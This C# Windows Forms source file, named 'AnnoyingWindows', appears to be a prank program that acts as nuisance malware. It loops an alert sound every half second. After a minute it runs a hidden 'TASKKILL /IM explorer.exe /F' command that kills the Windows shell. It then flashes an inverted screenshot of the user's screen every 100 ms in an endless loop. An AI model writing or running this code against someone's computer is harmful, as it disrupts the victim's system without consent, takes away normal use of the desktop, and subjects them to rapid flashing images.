namespace AnnoyingWindows;
using System.Media;
public partial class AnnoyingWindowsForm : Form
{
    public AnnoyingWindowsForm()
    {

        InitializeComponent();
        this.ClientSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        this.BackColor = Color.FromArgb(0, 47, 83);
        this.TransparencyKey = Color.FromArgb(0, 47, 83);
        Thread aud = new Thread(AnnoyingWindowsAudio);
        aud.Start();
        Thread.Sleep(60000);
        Thread vid = new Thread(AnnoyingWindowsVideo);
        vid.Start();

    }

    private void AnnoyingWindowsVideo()
    {
        System.Diagnostics.Process pr = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
        si.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        si.FileName = "cmd.exe";
        si.Arguments = "/C TASKKILL /IM explorer.exe /F";
        pr.StartInfo = si;
        pr.Start();
        Bitmap pic = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics g = Graphics.FromImage(pic);
        g.CopyFromScreen(Screen.PrimaryScreen.Bounds.Left, Screen.PrimaryScreen.Bounds.Top, 0, 0, Screen.PrimaryScreen.Bounds.Size);
        PictureBox pb = new PictureBox();
        pb.Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        pb.Image = (Image)pic.Clone();
        pb.Update();
        Bitmap invertedpic = (Bitmap)pic.Clone();
        for (int y = 0; (y <= (invertedpic.Height - 1)); y++)
        {
            for (int x = 0; (x <= (invertedpic.Width - 1)); x++)
            {
                Color inv = invertedpic.GetPixel(x, y);
                inv = Color.FromArgb(255, (255 - inv.R), (255 - inv.G), (255 - inv.B));
                invertedpic.SetPixel(x, y, inv);
            }
        }
        this.Invoke((MethodInvoker)delegate
        {
            this.Controls.Add(pb);
        });
        while (true)
        {

            this.Invoke((MethodInvoker)delegate
            {
                pb.Image = (Image)invertedpic.Clone();
                pb.Update();
                Thread.Sleep(100);
                pb.Image = (Image)pic.Clone();
                pb.Update();
                Thread.Sleep(100);

            });
        }
    }
    private void AnnoyingWindowsAudio()
    {
        while (true)
        {
            SystemSounds.Exclamation.Play();
            Thread.Sleep(500);
        }
    }


}
